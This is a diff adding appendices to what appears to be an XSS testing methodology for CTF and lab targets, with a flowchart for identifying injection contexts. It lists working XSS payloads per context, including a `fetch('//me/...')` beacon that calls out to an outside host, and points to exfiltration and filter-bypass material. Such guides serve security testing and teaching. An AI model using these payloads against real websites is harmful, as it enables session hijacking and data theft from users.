@@ -349,3 +349,104 @@ directly, no escaping beyond the string wrap.
 | svg | `<svg onload=alert(1)>` |
 | dom-code | `alert(1)` |
 | dom-markup | `<img src=x onerror=alert(1)>` |
+
+---
+
+## Appendix — context identification flowchart (detailed)
+
+For every injection point, answer these in order:
+
+```text
+Q1: does the marker appear in the RAW response at all?
+  no  → the value may be: stored (renders elsewhere), DOM-side only,
+        dropped by validation, or in a different response variant
+        (mobile vs desktop, locale, auth state)
+  yes → go to Q2
+
+Q2: how does it appear?
+  verbatim          → unescaped — good, go to Q3
+  entity-encoded    → &lt;img&gt; — markup-neutralized; find another
+                      context or encoding-layer bypass
+  stripped/partial  → filter eating pieces → filter-bypass.md §7
+  url-encoded       → %3Cimg — probably inside a URL attr or JS
+                      that doesn't decode — check where
+
+Q3: what surrounds it? (20-60 chars before the marker)
+  > " <                                           → html body
+  attr="XSS_PROBE_x"  attr='XSS_PROBE_x'          → attribute, quote noted
+  attr=XSS_PROBE_x                                → unquoted attribute
+  var x = "...XSS_PROBE_x..."                     → JS string
+  href="...XSS_PROBE_x..." or action/src/data     → URL attribute
+  <style>...XSS_PROBE_x...</style>                → CSS context
+  <!-- ...XSS_PROBE_x... -->                      → comment context
+  <title>/<textarea>/<xmp>/<noscript>/<noembed>   → RCDATA context
+
+Q4: is the enclosing element itself confined?
+  inside <select>/<option>      → only option-family tags parse
+  inside <table>               → only tr/td/th/caption parse
+  inside <svg>/<math>          → foreign-content rules
+  inside <head> before </head> → head-elements only; needs </head>
+                                  or head-legal tags (meta, base,
+                                  style, title)
+  inside <template>            → inert — content doesn't render
+                                  unless cloned by JS
+```
+
+## Appendix — the five contexts × first payload × confirming signal
+
+| # | Context signature | First payload | Confirmed by |
+|---|---|---|---|
+| 1 | `>X<` between tags | `<img src=x onerror="XSS_PROBE_x">` | handler exec / tag in DOM |
+| 2 | `attr="X"` | `" onerror="XSS_PROBE_x` or `"><img src=x onerror="XSS_PROBE_x">` | attr added or breakout tag |
+| 3 | `var s="X"` | `";XSS_PROBE_x;//` (as `alert` if exec needed — marker in code is not exec!) | JS-exec requires real code — use a fetch-beacon marker |
+| 4 | `href="X"` / `src="X"` | `javascript:fetch('//me/x')` or `javascript:alert(1)` | click/load fires the scheme |
+| 5 | `e.data` / `location.*` in JS | per-sink — see dom-xss.md | sink-side exec |
+
+Note for context 3 (JS string): a MARKER STRING inside JS code is
+inert — to confirm exec you must send code that signals back
+(e.g. `";fetch('//me/XSS_PROBE_x');//` — the listener hit is the
+confirmation). Same for any eval-family sink.
+
+## Appendix — quick ASCII decision tree
+
+```text
+marker in raw response?
+├── no → stored elsewhere? DOM source? validation drop?
+│        → stored-xss.md / dom-xss.md / headers-xss.md
+└── yes → what wraps it?
+        ├── > < between tags → html-context.md
+        ├── attr="x"         → attribute-context.md
+        ├── <script> var=…   → js-context.md
+        ├── href=/src= URL   → protocols.md
+        ├── <style>          → css-exfil.md / html-context.md §6
+        ├── <title>/<textarea>/<xmp> → close-tag escape, html-context.md §6
+        ├── <!-- -->         → --> escape, html-context.md §7
+        ├── <svg>/<math>     → foreign-content, svg-deep.md
+        ├── <select>/<table> → confined sets, html-context.md §8
+        └── template/framework binding → framework-sinks.md
+```
+
+Then: filtered? → filter-bypass.md. CSP? → csp.md. Deliver? →
+stored-xss.md / reflected-xss.md / blind-xss.md / bot-chains.md.
+Get data out? → exfil-methods.md / css-exfil.md.
+
+## Appendix — evidence minimum for a confirmed XSS finding
+
+```text
+a) marker in RAW response (verbatim excerpt, not a paraphrase)
+b) a context where markup or code survives unencoded, AND
+c) an observed effect: beacon request received / dialog fired /
+   DOM mutated / outbound request logged
+
+b+c without a = maybe. a alone = reflection, not XSS.
+```
+
+---
+
+## Appendix — closing note on coverage
+
+This corpus targets the web-XSS class for CTF challenges and lab
+targets: reflected, stored, DOM, blind, upload-carried, markdown,
+framework-sink, and second-order flows. It does not cover
+post-exploitation persistence or real-user phishing pages — CTF
+flags live in the victim session's data, not in password fields.
